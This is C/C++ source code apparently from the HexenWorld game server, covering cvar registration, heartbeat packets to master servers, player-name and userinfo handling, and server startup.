	Cvar_RegisterVariable (&timelimit);
	Cvar_RegisterVariable (&teamplay);
	Cvar_RegisterVariable (&samelevel);
	Cvar_RegisterVariable (&maxclients);
	Cvar_RegisterVariable (&maxspectators);
	Cvar_RegisterVariable (&hostname);
	Cvar_RegisterVariable (&skill);
	Cvar_RegisterVariable (&deathmatch);
	Cvar_RegisterVariable (&coop);
	Cvar_RegisterVariable (&randomclass);
	Cvar_RegisterVariable (&damageScale);
	Cvar_RegisterVariable (&meleeDamScale);
	Cvar_RegisterVariable (&shyRespawn);
	Cvar_RegisterVariable (&spartanPrint);
	Cvar_RegisterVariable (&manaScale);
	Cvar_RegisterVariable (&tomeMode);
	Cvar_RegisterVariable (&tomeRespawn);
	Cvar_RegisterVariable (&w2Respawn);
	Cvar_RegisterVariable (&altRespawn);
	Cvar_RegisterVariable (&fixedLevel);
	Cvar_RegisterVariable (&autoItems);
	Cvar_RegisterVariable (&dmMode);
	Cvar_RegisterVariable (&easyFourth);
	Cvar_RegisterVariable (&patternRunner);
	Cvar_RegisterVariable (&spawn);
	Cvar_RegisterVariable (&noexit);

	Cvar_RegisterVariable (&developer);

	Cvar_RegisterVariable (&timeout);
	Cvar_RegisterVariable (&zombietime);

	Cvar_RegisterVariable (&sv_maxvelocity);
	Cvar_RegisterVariable (&sv_gravity);
	Cvar_RegisterVariable (&sv_stopspeed);
	Cvar_RegisterVariable (&sv_maxspeed);
	Cvar_RegisterVariable (&sv_spectatormaxspeed);
	Cvar_RegisterVariable (&sv_accelerate);
	Cvar_RegisterVariable (&sv_airaccelerate);
	Cvar_RegisterVariable (&sv_wateraccelerate);
	Cvar_RegisterVariable (&sv_friction);
	Cvar_RegisterVariable (&sv_waterfriction);

	Cvar_RegisterVariable (&sv_aim);

	Cvar_RegisterVariable (&filterban);
	
	Cvar_RegisterVariable (&allow_download);
	Cvar_RegisterVariable (&allow_download_skins);
	Cvar_RegisterVariable (&allow_download_models);
	Cvar_RegisterVariable (&allow_download_sounds);
	Cvar_RegisterVariable (&allow_download_maps);

	Cvar_RegisterVariable (&sv_highchars);

	Cvar_RegisterVariable (&sv_phs);
	Cvar_RegisterVariable (&sv_namedistance);

	Cvar_RegisterVariable (&sv_ce_scale);
	Cvar_RegisterVariable (&sv_ce_max_size);

	Cmd_AddCommand ("addip", SV_AddIP_f);
	Cmd_AddCommand ("removeip", SV_RemoveIP_f);
	Cmd_AddCommand ("listip", SV_ListIP_f);
	Cmd_AddCommand ("writeip", SV_WriteIP_f);

	for (i=0 ; i<MAX_MODELS ; i++)
		sprintf (localmodels[i], "*%i", i);

	Info_SetValueForStarKey (svs.info, "*version", va("%4.2f", VERSION), MAX_SERVERINFO_STRING);

	// init fraglog stuff
	svs.logsequence = 1;
	svs.logtime = realtime;
	svs.log[0].data = svs.log_buf[0];
	svs.log[0].maxsize = sizeof(svs.log_buf[0]);
	svs.log[0].cursize = 0;
	svs.log[0].allowoverflow = true;
	svs.log[1].data = svs.log_buf[1];
	svs.log[1].maxsize = sizeof(svs.log_buf[1]);
	svs.log[1].cursize = 0;
	svs.log[1].allowoverflow = true;
}


//============================================================================

/*
================
Master_Heartbeat

Send a message to the master every few minutes to
let it know we are alive, and log information
================
*/
#define	HEARTBEAT_SECONDS	300
void Master_Heartbeat (void)
{
	char		string[2048];
	int			active;
	int			i;

	if (realtime - svs.last_heartbeat < HEARTBEAT_SECONDS)
		return;		// not time to send yet

	svs.last_heartbeat = realtime;

	//
	// count active users
	//
	active = 0;
	for (i=0 ; i<MAX_CLIENTS ; i++)
		if (svs.clients[i].state == cs_connected ||
		svs.clients[i].state == cs_spawned )
			active++;

	svs.heartbeat_sequence++;
	sprintf (string, "%c\n%i\n%i\n", S2M_HEARTBEAT,
		svs.heartbeat_sequence, active);


	// send to group master
	for (i=0 ; i<MAX_MASTERS ; i++)
		if (master_adr[i].port)
		{
			Con_Printf ("Sending heartbeat to %s\n", NET_AdrToString (master_adr[i]));
			NET_SendPacket (strlen(string), string, master_adr[i]);
		}

#ifndef _DEBUG
	// send to id master
	NET_SendPacket (strlen(string), string, idmaster_adr);
#endif
}

/*
=================
Master_Shutdown

Informs all masters that this server is going down
=================
*/
void Master_Shutdown (void)
{
	char		string[2048];
	int			i;

	sprintf (string, "%c\n", S2M_SHUTDOWN);

	// send to group master
	for (i=0 ; i<MAX_MASTERS ; i++)
		if (master_adr[i].port)
		{
			Con_Printf ("Sending heartbeat to %s\n", NET_AdrToString (master_adr[i]));
			NET_SendPacket (strlen(string), string, master_adr[i]);
		}

	// send to id master
#ifndef _DEBUG
	NET_SendPacket (strlen(string), string, idmaster_adr);
#endif
}

/*
=================
SV_ExtractFromUserinfo

Pull specific info from a newly changed userinfo string
into a more C freindly form.
=================
*/
void SV_ExtractFromUserinfo (client_t *cl)
{
	char		*val, *p, *q;
	int			i;
	client_t	*client;
	int			dupc = 1;
	char		newname[80];


	// name for C code
	val = Info_ValueForKey (cl->userinfo, "name");

	// trim user name
	strncpy(newname, val, sizeof(newname) - 1);
	newname[sizeof(newname) - 1] = 0;

	for (p = newname; *p == ' ' && *p; p++)
		;
	if (p != newname && *p) {
		for (q = newname; *p; *q++ = *p++)
			;
		*q = 0;
	}
	for (p = newname + strlen(newname) - 1; p != newname && *p == ' '; p--)
		;
	p[1] = 0;

	if (strcmp(val, newname)) {
		Info_SetValueForKey (cl->userinfo, "name", newname, MAX_INFO_STRING);
		val = Info_ValueForKey (cl->userinfo, "name");
	}

	if (!val[0] || !_stricmp(val, "console")) {
		Info_SetValueForKey (cl->userinfo, "name", "unnamed", MAX_INFO_STRING);
		val = Info_ValueForKey (cl->userinfo, "name");
	}

	// check to see if another user by the same name exists
	while (1) {
		for (i=0, client = svs.clients ; i<MAX_CLIENTS ; i++, client++) {
			if (client->state != cs_spawned || client == cl)
				continue;
			if (!_stricmp(client->name, val))
				break;
		}
		if (i != MAX_CLIENTS) { // dup name
			if (strlen(val) > sizeof(cl->name) - 1)
				val[sizeof(cl->name) - 4] = 0;
			p = val;

			if (val[0] == '(')
				if (val[2] == ')')
					p = val + 3;
				else if (val[3] == ')')
					p = val + 4;

			sprintf(newname, "(%d)%-0.40s", dupc++, p);
			Info_SetValueForKey (cl->userinfo, "name", newname, MAX_INFO_STRING);
			val = Info_ValueForKey (cl->userinfo, "name");
		} else
			break;
	}
	
	strncpy (cl->name, val, sizeof(cl->name)-1);	

	// rate command
	val = Info_ValueForKey (cl->userinfo, "rate");
	if (strlen(val))
	{
		i = atoi(val);
		if (i < 500)
			i = 500;
		if (i > 10000)
			i = 10000;
		cl->netchan.rate = 1.0/i;
	}

	// playerclass command
	val = Info_ValueForKey (cl->userinfo, "playerclass");
	if (strlen(val))
	{
		i = atoi(val);
		if(i>CLASS_DEMON&&dmMode.value!=DM_SIEGE)
			i = CLASS_PALADIN;
		if (i < 0 || i > MAX_PLAYER_CLASS || (!cl->portals && i == CLASS_DEMON))
		{
			i = 0;
		}
		cl->next_playerclass = cl->edict->v.next_playerclass = i;

		if (cl->edict->v.health > 0)
		{
			sprintf(newname,"%d",cl->playerclass);
			Info_SetValueForKey (cl->userinfo, "playerclass", newname, MAX_INFO_STRING);
		}
	}

	// msg command
	val = Info_ValueForKey (cl->userinfo, "msg");
	if (strlen(val))
	{
		cl->messagelevel = atoi(val);
	}

}


//============================================================================

/*
====================
SV_InitNet
====================
*/
void SV_InitNet (void)
{
	int	port;
	int	p;

	port = PORT_SERVER;
	p = COM_CheckParm ("-port");
	if (p && p < com_argc)
	{
		port = atoi(com_argv[p+1]);
		Con_Printf ("Port: %i\n", port);
	}
	NET_Init (port);

	Netchan_Init ();

	// heartbeats will allways be sent to the id master
	svs.last_heartbeat = -99999;		// send immediately

	NET_StringToAdr ("208.135.137.23:26900", &idmaster_adr);
}


/*
====================
SV_Init
====================
*/
void SV_Init (quakeparms_t *parms)
{
	try
	{
	GLog.AddListener(&MainLog);

	COM_InitArgv (parms->argc, parms->argv);
//	COM_AddParm ("-game");
//	COM_AddParm ("hw");

	if (COM_CheckParm ("-minmemory"))
		parms->memsize = MINIMUM_MEMORY;

	host_parms = *parms;

	if (parms->memsize < MINIMUM_MEMORY)
		SV_Error ("Only %4.1f megs of memory reported, can't execute game", parms->memsize / (float)0x100000);

	Memory_Init (parms->membase, parms->memsize);
	Cbuf_Init ();
	Cmd_Init ();	

	COM_Init (parms->basedir);
	
	PR_Init ();
	Mod_Init ();

	SV_InitNet ();

	SV_InitLocal ();
	Sys_Init ();
	Pmove_Init ();

	Hunk_AllocName (0, "-HOST_HUNKLEVEL-");
	host_hunklevel = Hunk_LowMark ();

	Cbuf_InsertText ("exec server.cfg\n");

	host_initialized = true;
	
	Con_Printf ("Exe: "__TIME__" "__DATE__"\n");
	Con_Printf ("%4.1f megabyte heap\n",parms->memsize/ (1024*1024.0));	
	Con_Printf ("======== HexenWorld Initialized ========\n");
	
// process command line arguments
	Cmd_StuffCmds_f ();
	Cbuf_Execute ();

// if a map wasn't specified on the command line, spawn start.map

	if (sv.state == ss_dead)
		Cmd_ExecuteString ("map demo1");
	if (sv.state == ss_dead)
		SV_Error ("Couldn't spawn a server");
	}
	catch (QException& e)
	{
		Sys_Error("%s", e.What());
	}
}

